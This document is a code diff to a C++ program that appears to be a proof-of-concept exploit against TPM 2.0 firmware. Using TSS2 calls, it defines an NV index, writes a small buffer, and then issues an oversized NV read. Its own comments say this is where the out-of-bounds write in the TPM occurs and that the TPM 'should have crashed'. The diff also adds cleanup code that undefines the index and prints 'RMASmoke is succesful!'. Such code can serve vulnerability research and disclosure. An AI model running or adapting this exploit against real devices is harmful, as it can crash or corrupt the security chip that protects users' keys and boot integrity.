@@ -74,7 +74,7 @@ uint32_t SendTPMCommand(tpm_result *buf, size_t len, tpm_result **respBuf,
   }
   int written = write(tpmfd, buf, len);
   if (written != len) {
-    printf("written != len; %lu != %d\n with rc %d", len, written, errno);
+    printf("written != len; %lu != %d\n with linux rc %d\n", len, written, errno);
     return -1;
   }
   char *responseBuffer = new char[2048];
@@ -137,6 +137,7 @@ void FailForBadRC(std::string fmt, int rc) {
     return;
   }
 }
+
 int main(int c, char **argv) {
 
   if (c <= 1) {
@@ -177,7 +178,8 @@ int main(int c, char **argv) {
   memset(&pub, 0, sizeof(pub));
   TPMA_NV x;
   UINT32 nvidx = (UINT32)(0x80000A);
-  pub.nvPublic.attributes = TPMA_NV_OWNERREAD | TPMA_NV_OWNERWRITE | TPMA_NV_AUTHREAD|TPMA_NV_AUTHWRITE;
+  pub.nvPublic.attributes = TPMA_NV_OWNERREAD | TPMA_NV_OWNERWRITE |
+                            TPMA_NV_AUTHREAD | TPMA_NV_AUTHWRITE;
   pub.nvPublic.dataSize = 2048;
   pub.nvPublic.nameAlg = TPM2_ALG_SHA256;
   pub.nvPublic.authPolicy.size = 0;
@@ -214,6 +216,7 @@ int main(int c, char **argv) {
   ClearTPMContext(sysctx);
 
   rc = Tss2_Sys_NV_DefineSpace_Prepare(sysctx, TPM2_RH_OWNER, &auth, &pub);
+  // TPMS Authorization, because of how it requires auth for nvram.
   TPMS_AUTH_COMMAND authcmd = {};
   authcmd.hmac = {
       .size = (UINT16)owner_password_len,
@@ -236,10 +239,10 @@ int main(int c, char **argv) {
   TPM2B_MAX_NV_BUFFER nvbuf;
   memset(nvbuf.buffer, 0, 1);
   nvbuf.size = 1;
-
+  // NVRAM write (This is where we control the data is copied).
   rc = Tss2_Sys_NV_Write_Prepare(sysctx, TPM2_RH_OWNER,
                                  TPM2_NV_INDEX_FIRST + nvidx, &nvbuf, 1024);
-  
+
   FailForBadRC("Tss2_Sys_NV_Write_Prepare Error %d\n", rc);
 
   Tss2_Sys_SetCmdAuths(sysctx, &cmd);
@@ -249,8 +252,9 @@ int main(int c, char **argv) {
   FailForBadRC("SendTPMCommand for NV_Write Error %d\n", rc);
 
   ClearTPMContext(sysctx);
-  rc = Tss2_Sys_NV_Read_Prepare(sysctx, TPM2_RH_OWNER, TPM2_NV_INDEX_FIRST + nvidx,
-                                2048, 0);
+  // Out of bounds write is here (in the tpm2 of course)
+  rc = Tss2_Sys_NV_Read_Prepare(sysctx, TPM2_RH_OWNER,
+                                TPM2_NV_INDEX_FIRST + nvidx, 2048, 0);
 
   Tss2_Sys_SetCmdAuths(sysctx, &cmd);
 
@@ -258,13 +262,19 @@ int main(int c, char **argv) {
 
   rc = SendTPMCommand(b, htobe32(b->length), &resultPtr, &resp_len, tpmfd);
 
-  
-  if (rc != 0) {
-    printf("This is fine and intentional. Cleaning up! TPM2 should have "
-           "crashed by now!!!\n");
-    close(tpmfd);
-    exit(-1);
-  }
+  ClearTPMContext(sysctx);
+  rc = Tss2_Sys_NV_UndefineSpace_Prepare(sysctx, TPM2_RH_OWNER,
+                                         TPM2_NV_INDEX_FIRST + nvidx);
+
+  FailForBadRC("Attempting to delete but received %d\n", rc);
+
+  Tss2_Sys_SetCmdAuths(sysctx, &cmd);
+
+  PreComplete(sysctx);
+  rc = SendTPMCommand(b, htobe32(b->length), &resultPtr, &resp_len, tpmfd);
+  FailForBadRC("Attempting to delete but received %d\n", rc);
+
+  printf("RMASmoke is succesful!");
   close(tpmfd);
   return 0;
 }
